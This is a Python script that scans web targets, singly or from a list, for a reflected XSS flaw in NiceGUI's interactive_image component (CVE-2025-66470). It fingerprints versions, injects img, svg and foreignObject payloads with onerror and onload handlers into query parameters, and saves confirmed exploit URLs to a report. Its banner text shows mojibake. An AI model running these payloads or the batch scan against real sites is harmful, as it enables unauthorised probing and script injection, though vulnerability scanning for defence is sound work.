#!/usr/bin/env python3
"""
NiceGUI XSS Scanner - CVE-2025-66470 / GHSA-2m4f-cg75-76w2

Detects XSS vulnerability in NiceGUI's ui.interactive_image component.
Affected: NiceGUI <= 3.3.1 | Fixed: NiceGUI 3.4.0+

Usage:
    python nicegui_scanner.py http://target.com/      # Single target
    python nicegui_scanner.py -l targets.txt          # Batch scan

Author: Security Researcher
License: MIT
"""

import requests
import re
import sys
import urllib.parse
import argparse
from datetime import datetime
from typing import Tuple, List

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ============================================================================
# COLORS
# ============================================================================
class C:
    R = '\033[91m'   # Red
    G = '\033[92m'   # Green  
    Y = '\033[93m'   # Yellow
    B = '\033[94m'   # Blue
    M = '\033[95m'   # Magenta
    C = '\033[96m'   # Cyan
    BOLD = '\033[1m'
    W = '\033[0m'    # Reset


# ============================================================================
# SCANNER
# ============================================================================
def scan_target(url: str, timeout: int = 10) -> Tuple[bool, bool, str, List[str]]:
    """
    Scan a single target for CVE-2025-66470.
    
    Returns: (is_nicegui, xss_confirmed, version, confirmed_exploit_urls)
    
    XSS is CONFIRMED only if all 3 checks pass:
        CHECK 1: Payload marker reflected in response
        CHECK 2: Dangerous HTML patterns present (<img, <svg, <foreignObject>)
        CHECK 3: JavaScript event handlers intact (onerror=, onload=)
    """
    # Normalize URL
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    url = url.strip().rstrip('/')
    
    # Session setup
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0'
    })
    
    # ========================================================================
    # STEP 1: Detect NiceGUI & Version
    # ========================================================================
    try:
        resp = session.get(url, timeout=timeout, verify=False)
    except Exception:
        return False, False, "Error", []
    
    # Extract version from /_nicegui/X.X.X/ pattern
    match = re.search(r'/_nicegui/(\d+\.\d+\.?\d*)', resp.text)
    if not match:
        # Check for other NiceGUI indicators
        if 'nicegui' not in resp.text.lower() and 'createApp(parseElements' not in resp.text:
            return False, False, "N/A", []
        version = "Unknown"
    else:
        version = match.group(1)
    
    # ========================================================================
    # STEP 2: Check if version is vulnerable (<= 3.3.1)
    # ========================================================================
    is_vuln_version = False
    try:
        parts = version.split('.')
        major = int(parts[0])
        minor = int(parts[1]) if len(parts) > 1 else 0
        patch = int(parts[2]) if len(parts) > 2 else 0
        
        if major < 3:
            is_vuln_version = True
        elif major == 3 and minor < 3:
            is_vuln_version = True
        elif major == 3 and minor == 3 and patch <= 1:
            is_vuln_version = True
    except:
        is_vuln_version = True  # Assume vulnerable if can't parse
    
    # ========================================================================
    # STEP 3: Test for XSS with 3 CONFIRMATION CHECKS
    # ========================================================================
    confirmed_urls = []
    MARKER = "NICEGUI_XSS_7x9k2m"
    
    # Test payloads (CVE-2025-66470 uses foreignObject)
    payloads = [
        f'<img src=x onerror=alert("{MARKER}")>',
        f'<svg onload=alert("{MARKER}")>',
        f'<foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror="alert(\'{MARKER}\')"></body></foreignObject>',
    ]
    
    # Priority parameters (content is the main CVE vector)
    params = ['content', 'svg', 'annotation', 'html', 'innerHTML', 'data']
    
    for param in params:
        for payload in payloads:
            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
            
            try:
                resp = session.get(test_url, timeout=timeout, verify=False)
                html = resp.text
                
                # ============================================
                # CHECK 1: Is the marker reflected?
                # ============================================
                if MARKER not in html:
                    continue
                
                # ============================================
                # CHECK 2: Dangerous HTML patterns present?
                # ============================================
                check2_patterns = ['<img src=x', '<svg onload', '<foreignobject>', '<body xmlns=']
                check2_passed = any(p in html.lower() for p in check2_patterns)
                if not check2_passed:
                    continue
                
                # ============================================
                # CHECK 3: Event handlers intact?
                # ============================================
                check3_patterns = ['onerror=alert', 'onerror="alert', "onerror='alert", 
                                   'onload=alert', 'onload="alert', "onload='alert"]
                check3_passed = any(p in html.lower() for p in check3_patterns)
                if not check3_passed:
                    continue
                
                # ============================================
                # ALL 3 CHECKS PASSED = XSS CONFIRMED!
                # ============================================
                confirmed_urls.append(test_url)
                break  # Found working payload for this param
                
            except Exception:
                continue
        
        if confirmed_urls:
            break  # Found confirmed XSS, no need to test more params
    
    xss_confirmed = len(confirmed_urls) > 0
    return True, xss_confirmed, version, confirmed_urls


# ============================================================================
# MAIN
# ============================================================================
def main():
    parser = argparse.ArgumentParser(
        description='NiceGUI XSS Scanner - CVE-2025-66470',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s http://target.com/           # Single target
  %(prog)s -l targets.txt               # Batch scan from file
  %(prog)s -l targets.txt --timeout 15  # With custom timeout
        '''
    )
    parser.add_argument('target', nargs='?', help='Target URL')
    parser.add_argument('-l', '--list', type=str, help='File with URLs (one per line)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (default: 10)')
    
    args = parser.parse_args()
    
    # Validate arguments
    if not args.target and not args.list:
        parser.error("Provide target URL or use -l/--list with file")
    
    # Banner
    print(f"""
{C.C}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  NiceGUI XSS Scanner - CVE-2025-66470                        â•‘
â•‘  Vulnerability: ui.interactive_image unsanitized SVG         â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•{C.W}
""")
    
    # Get URLs to scan
    if args.list:
        try:
            with open(args.list, 'r', encoding='utf-8') as f:
                urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except FileNotFoundError:
            print(f"{C.R}[ERROR] File not found: {args.list}{C.W}")
            sys.exit(1)
        except Exception as e:
            print(f"{C.R}[ERROR] Cannot read file: {e}{C.W}")
            sys.exit(1)
    else:
        urls = [args.target]
    
    if not urls:
        print(f"{C.R}[ERROR] No URLs to scan{C.W}")
        sys.exit(1)
    
    print(f"[*] Scanning {len(urls)} target(s)...\n")
    print(f"{'â”€'*70}")
    
    # Results storage
    results = []
    confirmed_count = 0
    nicegui_count = 0
    
    # ========================================================================
    # SCAN EACH URL
    # ========================================================================
    for i, url in enumerate(urls, 1):
        # Truncate long URLs for display
        display_url = url[:45] + '...' if len(url) > 48 else url
        print(f"[{i}/{len(urls)}] {display_url:<48} ", end='', flush=True)
        
        # Scan
        is_nicegui, xss_confirmed, version, exploit_urls = scan_target(url, args.timeout)
        
        # Display result
        if xss_confirmed:
            print(f"{C.R}ðŸš¨ CONFIRMED{C.W} (v{version})")
            confirmed_count += 1
            nicegui_count += 1
            results.append((url, version, "CONFIRMED", exploit_urls))
        elif is_nicegui:
            print(f"{C.Y}âš  VULN_VER{C.W} (v{version})")
            nicegui_count += 1
            results.append((url, version, "VULN_VER", []))
        else:
            print(f"{C.G}âœ“ NOT_NICEGUI{C.W}")
            results.append((url, version, "NOT_NICEGUI", []))
    
    print(f"{'â”€'*70}")
    
    # ========================================================================
    # SUMMARY
    # ========================================================================
    print(f"\n{C.BOLD}SUMMARY:{C.W}")
    print(f"  Total scanned:   {len(urls)}")
    print(f"  NiceGUI found:   {nicegui_count}")
    print(f"  {C.R}XSS CONFIRMED:   {confirmed_count}{C.W}")
    
    # ========================================================================
    # SAVE RESULTS (only if confirmed)
    # ========================================================================
    if confirmed_count > 0:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"nicegui_CONFIRMED_{timestamp}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"NiceGUI XSS Scanner - CVE-2025-66470\n")
            f.write(f"Scan Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'='*60}\n\n")
            f.write(f"CONFIRMED XSS TARGETS: {confirmed_count}\n")
            f.write(f"{'â”€'*60}\n\n")
            
            for url, ver, status, exploits in results:
                if status == "CONFIRMED":
                    f.write(f"ðŸš¨ TARGET: {url}\n")
                    f.write(f"   Version: {ver}\n")
                    f.write(f"   Status: XSS CONFIRMED (All 3 checks passed)\n")
                    if exploits:
                        f.write(f"   Exploit URL:\n")
                        for e in exploits:
                            f.write(f"      {e}\n")
                    f.write(f"\n")
            
            f.write(f"\n{'â”€'*60}\n")
            f.write(f"ALL SCAN RESULTS:\n")
            f.write(f"{'â”€'*60}\n")
            for url, ver, status, _ in results:
                f.write(f"{url} | v{ver} | {status}\n")
            
            f.write(f"\n{'â”€'*60}\n")
            f.write(f"CVE: CVE-2025-66470\n")
            f.write(f"Advisory: https://github.com/advisories/GHSA-2m4f-cg75-76w2\n")
        
        print(f"\n{C.G}âœ“ Report saved: {filename}{C.W}")
    else:
        print(f"\n{C.B}[*] No confirmed XSS - no file saved{C.W}")
    
    print()
    sys.exit(1 if confirmed_count > 0 else 0)


if __name__ == "__main__":
    main()
